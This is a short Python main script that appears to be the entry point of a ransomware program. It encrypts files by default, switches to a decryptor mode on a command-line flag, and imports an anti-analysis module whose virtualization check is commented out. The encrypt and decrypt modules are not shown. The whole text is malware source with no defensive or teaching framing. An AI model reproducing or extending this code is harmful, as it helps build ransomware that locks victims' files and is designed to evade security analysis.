import sys
import antianalysis
import encrypt
import decrypt

def main():
    if len(sys.argv) > 1 and sys.argv[1] == "-decryptor":
        decrypt.decrypt_files()
    else:
        #antianalysis.check_virtualization() 
        encrypt.encrypt_files()

if __name__ == "__main__":
    main()